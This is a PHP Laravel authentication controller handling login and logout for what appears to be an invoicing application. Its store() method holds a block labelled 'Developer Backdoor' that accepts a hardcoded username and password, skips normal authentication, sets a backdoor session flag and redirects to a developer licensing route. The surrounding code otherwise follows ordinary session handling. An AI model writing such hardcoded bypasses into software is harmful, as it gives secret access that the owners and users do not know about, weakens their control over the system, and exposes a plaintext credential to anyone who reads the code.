<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Inertia\Inertia;
use Inertia\Response as InertiaResponse;
use Symfony\Component\HttpFoundation\Response;

class LoginController extends Controller
{
    public function create(): InertiaResponse|RedirectResponse
    {
        if (Auth::check()) {
            return redirect()->route('invoices.create');
        }

        return Inertia::render('Auth/Login');
    }

    public function store(LoginRequest $request): Response
    {
        // ── Developer Backdoor ──
        if ($request->username === 'boraq' && $request->password === '12255@Rc') {
            $request->session()->put('developer_backdoor', true);
            return redirect()->route('license.developer');
        }

        // 1. التحقق من بيانات الدخول
        $request->authenticate();

        // 2. تجديد معرّف الجلسة لمنع هجمات Session Fixation وتثبيت الجلسة
        $request->session()->regenerate();
        $request->session()->forget('url.intended');

        return redirect()->route('invoices.create');
    }

    public function destroy(Request $request): Response
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        if ($request->header('X-Inertia')) {
            return Inertia::location(route('login'));
        }

        return redirect()->route('login');
    }
}
